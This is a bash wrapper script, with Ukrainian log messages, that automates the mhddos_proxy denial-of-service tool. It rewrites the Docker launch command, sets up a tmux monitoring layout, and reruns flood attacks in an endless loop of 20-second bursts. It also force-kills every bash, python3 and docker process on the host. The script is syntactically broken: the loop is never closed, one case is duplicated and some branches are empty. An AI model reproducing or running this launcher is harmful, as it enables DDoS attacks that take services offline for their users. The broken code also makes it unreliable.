clear
logfile="/var/log/attack.log"
mode=$1  
parameter=$2
command=$3

function prepare_command {
        command=${command#"docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "}
        command=${command%" -t 1000 -p 1200 --rpc 1000 --debug"}
        command="docker run -i --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "$command" -t "$parameter" -p 900 --rpc 1000 --table"
}

function create_environment {
        tmux new-session -s attack -d
        tmux split-window -t attack -h -p 50
        tmux split-window -t attack -v -p 66
        tmux split-window -t attack -v -p 50
}

function fill_environment {
        tmux select-window -t attack
        tmux send-keys -t 1 C-z 'htop' Enter
        tmux send-keys -t 2 C-z 'nload eth0' Enter
        tmux send-keys -t 3 C-z 'tail -f ' "$logfile" Enter
}

function write_to_log {
        #echo "$(date "+%d.%m.%Y %H:%M:%S")" "$1" >> $logfile
        echo "$(date "+%d.%m.%Y %H:%M:%S")" "$1"
}

function kill_environment {
        pkill -KILL bash 
        pkill -KILL python3 
        pkill -KILL docker 
        tmux kill-session
        systemctl restart docker.service
}


function attack {
        tmux select-window -t attack & tmux send-keys -t 0 "$command" Enter & sleep 20 && tmux send-keys -t 0 C-c Enter && sleep 5 && tmux send-keys -t 0 "systemctl restart docker.service" Enter
}

case $mode in
        attack)
        write_to_log 'Аналізую команду'
        prepare_command
        write_to_log 'Команда відредагована'
        kill_environment
        write_to_log 'Завершення роботи оточення'
        create_environment
        write_to_log 'Нове оточення створено'
        fill_environment
        write_to_log 'Нове оточення наповнено'
        while true
        do
                write_to_log 'Розпочинаю цикл атаки'
                attack
                write_to_log 'Цикл атаки завершено, перезапускаю докер, шоб не висло'
                ;;

        change)
                ;;

        halt)
                ;;

        change)
                ;;

        *)
        echo "Йа нєпанімаю ваш язік. Пішітє правельно!"
        write_to_log 'Йа нєпанімаю ваш язік. Пішітє правельно!'
        ;;
esac